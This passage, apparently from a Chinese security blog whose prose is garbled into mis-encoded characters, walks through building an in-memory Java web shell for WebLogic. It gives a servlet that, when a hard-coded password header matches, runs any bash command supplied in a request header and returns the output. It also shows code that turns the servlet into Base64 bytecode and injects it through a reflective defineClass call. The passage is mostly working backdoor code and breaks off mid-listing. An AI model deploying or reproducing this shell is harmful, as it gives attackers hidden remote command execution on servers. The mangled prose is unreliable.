</span></span></code></pre></td></tr></table></div></div><h4 id=ä½¿ç”¨å­—èŠ‚ç å®šä¹‰servlet>ä½¿ç”¨å­—èŠ‚ç å®šä¹‰servlet<a hidden class=anchor aria-hidden=true href=#ä½¿ç”¨å­—èŠ‚ç å®šä¹‰servlet>#</a></h4><p>ä¸Šé¢æåˆ°ç›´æ¥è‡ªå®šä¹‰servletæ²¡æœ‰æˆåŠŸï¼Œäºæ˜¯å°è¯•ä½¿ç”¨å­—èŠ‚ç æ¥åŠ è½½è‡ªå®šä¹‰çš„servletã€‚</p><p>è‡ªå®šä¹‰ä¸€ä¸ªservletï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-106-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-106-21>21</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span><span style=color:#f92672>(</span>HttpServletRequest req<span style=color:#f92672>,</span> HttpServletResponse resp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String passwd<span style=color:#f92672>=</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(!</span><span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>passwd<span style=color:#f92672>)){</span><span style=color:#66d9ef>return</span><span style=color:#f92672>;}</span>
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç”Ÿæˆè¯¥servletå¯¹åº”çš„å­—èŠ‚ç </p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-107-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-107-19>19</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServletGenByteCode</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            String bytecode<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>bytecode<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä½¿ç”¨è¯¥å­—èŠ‚ç ç”Ÿæˆservletå¯¹è±¡</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-108-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-108-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADExxxxxxxxxâ€¦â€¦&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code<span style=color:#f92672>=</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Method defineClass<span style=color:#f92672>=</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;defineClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>HttpServlet memsHttpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=è§£å†³duplicate-class-definition>è§£å†³duplicate class definition<a hidden class=anchor aria-hidden=true href=#è§£å†³duplicate-class-definition>#</a></h4><p>å‘ç°ä¼šæŠ¥é”™</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-109-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-109-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>loader <span style=color:#f92672>(</span>instance of  com/oracle/classloader/weblogic/LaunchClassLoader<span style=color:#f92672>)</span>: attempted  duplicate class definition <span style=color:#66d9ef>for</span> name: <span style=color:#e6db74>&#34;pers/neo/memsHttpServlet&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220704164544546.png alt=image-20220704164544546></p><p>æ˜¯å› ä¸ºæˆ‘ä»¬ä¹‹å‰å·²ç»åŠ è½½è¿‡è¿™ä¸ªç±»äº†ã€‚ä¸èƒ½å†ä½¿ç”¨åŒä¸€ä¸ªç±»åäº†ã€‚</p><p>äºæ˜¯é€šè¿‡åå°„åœ¨æ¯æ¬¡æµ‹è¯•æ—¶ä¿®æ”¹è‡ªå®šä¹‰servletçš„åç§°ï¼Œè€Œä¸æ˜¯é¢‘ç¹refactoré‚£ä¸ªç±»ï¼Œä»¥æ­¤é¿å…é‡å¤å®šä¹‰ç±»çš„é—®é¢˜ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-110-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-110-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServletGenByteCode</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
